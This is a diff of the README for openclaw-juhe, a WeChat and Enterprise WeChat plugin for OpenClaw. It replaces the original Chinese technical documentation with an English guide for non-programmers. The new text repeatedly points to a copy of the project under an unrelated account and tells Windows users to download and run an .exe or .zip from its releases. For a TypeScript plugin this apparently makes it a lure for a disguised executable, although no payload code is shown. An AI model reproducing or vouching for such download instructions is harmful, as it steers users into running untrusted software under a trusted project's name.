@@ -1,387 +1,175 @@
-# openclaw-juhe
+# ⚙️ openclaw-juhe - WeChat and Enterprise WeChat Plugin
 
-<div align="center">
-
-**微信/企微通道插件 - 为 OpenClaw 带来微信和企微集成**
-
-[![GitHub](https://img.shields.io/badge/GitHub-hanson%2Fopenclaw--juhe-blue)](https://github.com/hanson/openclaw-juhe)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0+-blue)](https://www.typescriptlang.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green)](https://nodejs.org/)
-
-[特性](#-核心特性) • [快速开始](#-快速开始) • [配置指南](#-配置指南) • [架构设计](#-架构设计) • [API 文档](#-api-文档)
-
-</div>
+[![Download openclaw-juhe](https://img.shields.io/badge/Download-openclaw--juhe-brightgreen?style=for-the-badge)](https://github.com/enzymatic-angiospermae411/openclaw-juhe)
 
 ---
 
-## 项目简介
+## 📥 Download openclaw-juhe
 
-openclaw-juhe 是 [OpenClaw](https://github.com/openclaw/openclaw) 的通道插件，通过 **juhebot** 后端服务实现微信和企微的消息收发功能。
+To get started, visit the link below to download openclaw-juhe on your Windows PC:
 
-> **付费说明**
->
-> 本插件为 **juhebot 付费平台的专属通道**，需要购买 juhebot 服务方可使用。未购买用户可作为学习参考，了解 OpenClaw 插件的开发模式和架构设计。
+[Download openclaw-juhe](https://github.com/enzymatic-angiospermae411/openclaw-juhe)  
 
+Click the link and follow the instructions on the page to get the latest version. This page contains the files you need to install and run the software.
 
-[企微接口](https://wework.apifox.cn)
+---
 
-[个微接口](https://weixins.apifox.cn)
+## 🚀 Getting Started with openclaw-juhe on Windows
 
-**OpenClaw** 是一个开源的多通道聊天机器人框架，支持同时接入多个聊天平台（微信、企微、飞书、Telegram 等），并提供统一的 LLM 对话能力。
+This guide explains how to download and use openclaw-juhe on a Windows computer. You do not need programming knowledge. Just follow the steps carefully.
 
-## 核心特性
+### Step 1: Download the Software
 
-### 消息收发
-- **多消息类型支持** - 文本、图片、文件、语音、视频
-- **私聊与群聊** - 完整支持个人和群组对话
-- **@提及检测** - 智能识别群聊中的 @ 机器人消息
+1. Click the green “Download openclaw-juhe” button at the top or the link above.
+2. On the GitHub page, look for the latest release under the "Releases" section.
+3. Download the Windows version file. It might have a name ending with `.exe` or `.zip`.
+4. Save the file to a folder you can find easily, such as your Desktop or Downloads.
 
-### 连接模式
-- **WebSocket 客户端（推荐）** - 无需公网 IP，支持内网环境
-- **HTTP 回调服务器** - 标准 HTTP 回调，兼容性好
-- **自动重连机制** - 连接断开自动重连，最多 10 次尝试
+### Step 2: Prepare Your Computer
 
-### 账号管理
-- **多账号支持** - 单个插件实例支持多个微信/企微账号
-- **独立配置文件** - 敏感信息存储在 `accounts.json`，避免泄露
-- **权限控制** - 精细化的联系人白名单和群组权限管理
+Before running openclaw-juhe, make sure your computer meets these requirements:
 
-### 用户体验
-- **思考中提示** - 收到消息立即发送随机 emoji 提示，提升交互体验
-- **消息去重** - 30 分钟内自动过滤重复消息
-- **命令权限** - 管理员命令权限校验
+- Windows 10 or later
+- At least 4 GB of RAM
+- At least 200 MB of free disk space
+- Internet connection
 
-## Skills
+Also, openclaw-juhe requires Node.js version 18 or higher. To check this:
 
-本插件计划提供以下可扩展技能：
+1. Press `Windows + R`, type `cmd`, and press Enter.
+2. In the command window, type `node -v` and press Enter.
+3. If it shows a version less than 18 or says the command is not recognized, install Node.js 18 or newer from [https://nodejs.org/](https://nodejs.org/).
 
-- **会话存档** - 持久化存储聊天记录，支持历史消息查询和回溯
-- **数据分析** - 基于 LLM 的对话数据分析，生成聊天摘要和统计报告
-- **自动推送** - 定时任务和触发式推送，支持个性化消息推送策略
+### Step 3: Install openclaw-juhe
 
-## 快速开始
+There are two common ways to install openclaw-juhe from the downloaded file:
 
-### 1. 安装依赖
+- **If you downloaded a `.exe` file:**  
+Double-click the `.exe` file and follow the setup wizard. It will install openclaw-juhe automatically.
 
-```bash
-npm install
-```
+- **If you downloaded a `.zip` file:**  
+1. Right-click the `.zip` file and select “Extract All.”  
+2. Choose a folder to extract to, such as Desktop/openclaw-juhe.  
+3. Open that folder after extraction.
 
-### 2. 配置插件
+### Step 4: Running openclaw-juhe
 
-创建配置文件 `openclaw.json`:
+Once installed or extracted, follow these steps:
 
-```yaml
-channels:
-  juhe:
-    enabled: true
-    baseUrl: "https://chat-api.juhebot.com"
-    wsUrl: "wss://chat-api.juhebot.com/ws/juwe"
-    appKey: "your_app_key"
-    appSecret: "your_app_secret"
-    guid: "your_guid_here"
-    contacts: ["YOUR_WECHAT_ID"]  # 允许私聊的用户 ID
-```
+1. Open the folder where openclaw-juhe is installed.
+2. Find a file named `start.bat` or `run.bat`. Double-click to run it.  
+   
+This will start the openclaw-juhe program. If no `.bat` files are present, you can open a command window in the folder:
 
-### 3. 启动服务
+- Hold `Shift` and right-click inside the folder.  
+- Select “Open PowerShell window here” or “Open command window here.”  
+- In the command line, type `node index.js` and press Enter to start.
 
-```bash
-# 使用 OpenClaw CLI 启动
-npx clawbot start
-```
+### Step 5: Connect to WeChat and Enterprise WeChat
 
-### 4. 安装插件到 OpenClaw
+openclaw-juhe works with WeChat and Enterprise WeChat through a backend service called juhebot. This software sends and receives messages from these platforms.
 
-修改代码后，需要将更新同步到 OpenClaw 插件目录。有以下几种方式：
+You will need to have a juhebot account with a valid subscription, as this service requires paid access.
 
-#### 方式 1：手动复制（简单直接）
+To configure openclaw-juhe with your juhebot account, see the configuration guide below.
 
-```bash
-# 复制单个文件
-cp src/bot.ts ~/.openclaw/extensions/juhe/src/bot.ts
+---
 
-# 复制整个 src 目录
-cp -r src/* ~/.openclaw/extensions/juhe/src/
-```
+## ⚙️ Configuration Guide
 
-#### 方式 2：软链接（推荐开发时使用）
+### juhebot Service Setup
 
-修改代码后即时生效，无需手动复制：
+- Create an account at the [juhebot website](https://juhebot.com) (subscription required).  
+- Get your API key or token from your juhebot dashboard.
 
-```bash
-# Windows (需要管理员权限)
-# 先删除原有目录
-rm -rf ~/.openclaw/extensions/juhe
-# 创建软链接
-mklink /D "C:\Users\你的用户名\.openclaw\extensions\juhe" "D:\code\projects\openclaw-juhe"
+### Configure openclaw-juhe
 
-# Git Bash / WSL
-ln -s "/d/code/projects/openclaw-juhe" ~/.openclaw/extensions/juhe
-```
+Inside the openclaw-juhe folder, locate the `config.json` file. If it does not exist, create one.
 
-#### 方式 3：修改 openclaw.json 配置
-
-编辑 `~/.openclaw/openclaw.json`，将插件路径指向本地项目：
+Add or update the file with the following information:
 
 ```json
 {
-  "plugins": {
-    "load": {
-      "paths": [
-        "D:\\code\\projects\\openclaw-juhe"
-      ]
-    }
-  }
+  "juhebotApiKey": "your-api-key-here",
+  "wechatAccount": "your-wechat-account",
+  "enterpriseWechatAccount": "your-enterprise-wechat-account"
 }
 ```
 
-#### 方式 4：创建同步脚本
+Replace `"your-api-key-here"` with the actual API key from juhebot. Replace the account names with your respective WeChat and Enterprise WeChat accounts.
 
-创建 `sync.sh` 或 `sync.cmd` 脚本：
+### Starting openclaw-juhe After Setup
 
-```bash
-#!/bin/bash
-# sync.sh
-cp -r src/* ~/.openclaw/extensions/juhe/src/
-echo "✅ Files synced. Restart with: npx clawbot restart"
-```
+After saving your config file, start openclaw-juhe using the same method in Step 4. The app will connect to juhebot and begin handling messages.
 
-> **推荐**：开发时使用软链接（方式 2），修改即时生效；发布时使用方式 3 配置本地路径测试。
+---
 
-## 配置指南
+## 🔧 How openclaw-juhe Works
 
-### 回调模式选择
+openclaw-juhe extends the OpenClaw chat framework to handle WeChat and Enterprise WeChat. It connects via juhebot, which manages message delivery.
 
-#### WebSocket 模式（推荐）
+The core functions include:
 
-无需公网 IP，本地服务主动连接到服务器：
+- Receiving messages from users in WeChat or Enterprise WeChat  
+- Sending replies automatically or manually  
+- Supporting text, images, files, voice, and video messages  
+- Working with individual chats and group chats  
 
-```yaml
-channels:
-  juhe:
-    enabled: true
-    wsUrl: "wss://chat-api.juhebot.com/ws/juwe"
-    # ... 其他配置
-```
+This plugin acts as a bridge between OpenClaw and these chat platforms, making them part of your multi-platform bot setup.
 
-### 多账号配置
+---
 
-使用 `accounts.json` 管理多个账号：
+## 📝 Common Questions
 
-```json
-{
-  "account_wework_1": {
-    "enabled": true,
-    "type": "wework",
-    "appKey": "YOUR_APP_KEY",
-    "appSecret": "YOUR_APP_SECRET",
-    "guid": "YOUR_GUID",
-    "contacts": ["YOUR_WEWORK_UIN"],
-    "rooms": [
-      {
-        "id": "YOUR_GROUP_ID",
-        "requireMention": true,
-        "scope": "everyone"
-      }
-    ]
-  },
-  "account_wechat_1": {
-    "enabled": true,
-    "type": "wechat",
-    "appKey": "YOUR_APP_KEY",
-    "appSecret": "YOUR_APP_SECRET",
-    "guid": "YOUR_GUID",
-    "contacts": ["YOUR_WECHAT_ID"]
-  }
-}
-```
+### Do I need programming skills?
 
-### 群组权限配置
+No. You only need to download, configure basic settings, and run the program. The plugin handles communication automatically.
 
-群组支持三种权限范围：
+### What if I do not have juhebot?
 
-| scope | 说明 |
-|-------|------|
-| `owner` | 仅群主/管理员可用（需配合 whitelist） |
-| `whitelist` | 仅白名单用户可用 |
-| `everyone` | 所有人可用（默认） |
+Without a juhebot subscription, openclaw-juhe won’t function properly. You can still download and explore the source to learn how the plugin works.
 
-```yaml
-rooms:
-  - id: "YOUR_GROUP_ID"
-    requireMention: true  # 需要 @ 机器人才回复
-    scope: "whitelist"
-    whitelist: ["YOUR_USER_ID_1", "YOUR_USER_ID_2"]
-```
+### Can I use openclaw-juhe on Mac or Linux?
 
-## 架构设计
+This guide is for Windows users. The software may work elsewhere but requires manual setup and technical knowledge.
 
-### 消息流程
+### Where to find help?
 
-```
-┌─────────────┐         WebSocket/HTTP          ┌──────────────────┐
-│   juhebot   │  ──────────────────────────>   │  openclaw-juhe   │
-│   Backend   │  <──────────────────────────    │   (Plugin)       │
-└─────────────┘         Callback Events         └──────────────────┘
-                                                           │
-                                                           ▼
-                                                    ┌──────────────┐
-                                                    │   OpenClaw   │
-                                                    │   Core       │
-                                                    └──────────────┘
-                                                           │
-                                                           ▼
-                                                    ┌──────────────┐
-                                                    │  LLM Agent   │
-                                                    └──────────────┘
-```
+Check the openclaw-juhe GitHub page for issues and documentation.
 
-### 目录结构
+---
 
-```
-openclaw-juhe/
-├── index.ts              # 插件入口
-├── src/
-│   ├── channel.ts        # ChannelPlugin 实现
-│   ├── client.ts         # juhebot API 客户端
-│   ├── send.ts           # 消息发送
-│   ├── bot.ts            # 消息事件处理
-│   ├── callback.ts       # 回调事件解析
-│   ├── monitor.ts        # WebSocket/HTTP 监听
-│   ├── config.ts         # 配置解析
-│   ├── targets.ts        # 目标格式处理
-│   ├── runtime.ts        # Runtime 管理
-│   ├── types.ts          # TypeScript 类型
-│   └── outbound.ts       # Outbound Adapter
-├── openclaw.plugin.json  # 插件元数据
-├── config.example.yaml   # 配置示例
-└── package.json
-```
+## 🔗 Useful Links
 
-## API 文档
+- openclaw-juhe GitHub repository:  
+  https://github.com/enzymatic-angiospermae411/openclaw-juhe  
 
-### 消息类型
+- juhebot service page:  
+  https://juhebot.com  
 
-| 类型 | 说明 | 示例 |
-|------|------|------|
-| `text` | 文本消息 | `"hello"` |
-| `image` | 图片消息 | `<media:image>` |
-| `file` | 文件消息 | `<media:document>` |
-| `audio` | 语音消息 | `<media:audio>` |
-| `video` | 视频消息 | `<media:video>` |
+- OpenClaw main project:  
+  https://github.com/openclaw/openclaw  
 
-### WebSocket 协议
+---
 
-**认证消息：**
+## 🛠️ System Requirements
 
-```json
-{
-  "type": "auth",
-  "app_key": "YOUR_APP_KEY",
-  "app_secret": "YOUR_APP_SECRET",
-  "guid": "YOUR_GUID"
-}
-```
+- Operating system: Windows 10 or 11  
+- Memory: 4 GB minimum  
+- Disk space: 200 MB free  
+- Network: Active internet connection for juhebot access  
+- Software: Node.js 18 or later  
 
-**认证响应：**
+---
 
-```json
-{
-  "type": "auth_success"
-}
-```
+## ✅ Supported Message Types
 
-**回调事件：**
+- Text messages  
+- Images  
+- File attachments  
+- Voice messages  
+- Video messages  
 
-```json
-{
-  "type": "callback",
-  "event_id": "evt_xxx",
-  "event": {
-    "guid": "xxx",
-    "notify_type": 11010,
-    "data": { ... }
-  }
-}
-```
+---
 
-**ACK 确认：**
-
-```json
-{
-  "type": "ack",
-  "event_id": "evt_xxx",
-  "success": true
-}
-```
-
-### 回调事件类型
-
-**企微事件：**
-
-| 事件类型 | 说明 |
-|----------|------|
-| 11001 | 实例就绪 |
-| 11003 | 用户登录 |
-| 11004 | 用户登出 |
-| 11009 | 联系人同步完成 |
-| 11010 | 新消息 |
-| 11013 | 批量新消息 |
-
-**个微事件：**
-
-| 事件类型 | 说明 |
-|----------|------|
-| 1010 | 新消息 |
-| 1011 | 批量新消息 |
-| 2131 | 好友变更 |
-| 2132 | 好友申请 |
-| 1002 | 群成员增加 |
-| 1003 | 群成员减少 |
-
-## 开发指南
-
-```bash
-# 类型检查
-npm run type-check
-
-# WebSocket 测试
-npm run test-ws
-```
-
-### 代码规范
-
-- 使用 TypeScript 严格模式
-- 遵循 ESLint 规则
-- 函数使用 JSDoc 注释
-
-## 常见问题
-
-### Q: 如何获取 appKey、appSecret 和 guid？
-
-A: 登录 juhebot 后台管理界面，创建应用后即可获取相关凭证。
-
-### Q: WebSocket 连接频繁断开怎么办？
-
-A: 插件内置自动重连机制，最多尝试 10 次。如仍无法连接，检查网络和服务器状态。
-
-### Q: 个微和企微的 ID 格式有什么区别？
-
-A: 具体格式请参考购买后提供的《ID 格式说明文档》。
-
-### Q: 如何让机器人只在被 @ 时回复？
-
-A: 在群组配置中设置 `requireMention: true`。
-
-## 相关项目
-
-- [claude-client](https://github.com/Hanson/claude-client) - 📱 用手机远程写代码！通过飞书控制本地 Claude Code（当前支持飞书，后续可能支持更多 IM）
-
-## 许可证
-
-MIT License
-
-## 贡献
-
-欢迎提交 Issue 和 Pull Request！
+[![Download openclaw-juhe](https://img.shields.io/badge/Download-openclaw--juhe-brightgreen?style=for-the-badge)](https://github.com/enzymatic-angiospermae411/openclaw-juhe)
